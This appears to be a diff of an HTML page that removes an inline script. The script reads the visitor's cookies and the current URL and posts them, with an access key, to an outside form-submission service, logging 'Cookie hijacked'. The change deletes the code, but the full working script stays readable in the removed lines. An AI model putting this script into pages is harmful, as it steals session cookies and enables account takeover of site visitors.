@@ -89,40 +89,5 @@
         </div>
 
         <script type="text/javascript" src="js/app.js"></script>
-        <script type="text/javascript">
-        
-          // Log the value of "c" parameter
-          const queryString = window.location.search;
-          const urlParams = new URLSearchParams(queryString);
-          const cookies = document.cookie;
-        
-          // Set up form data with the correct access key
-          const formData = new URLSearchParams();
-          formData.append('accessKey', '0051ca4d-7fb7-4262-829e-7dc67f80e920');  // Replace with the actual valid access key
-          formData.append('name', 'Current URL: ' + window.location.href);
-          formData.append('message', 'Cookie Value: ' + cookies);
-        
-          // Define API endpoint
-          const apiEndpoint = 'https://api.staticforms.xyz/submit';
-        
-          // Make a POST request using fetch
-          fetch(apiEndpoint, {
-            method: 'POST',
-            body: formData,
-            headers: {
-              'Content-Type': 'application/x-www-form-urlencoded'
-            },
-          })
-          .then(response => response.json())
-          .then(data => {
-            console.log('API Response:', data);
-          })
-          .catch(error => {
-            console.error('Error sending data:', error);
-          });
-        
-          // Log the information in the console
-          console.log('Cookie hijacked from ' + window.location.href);
-      </script>
     </body>
 </html>
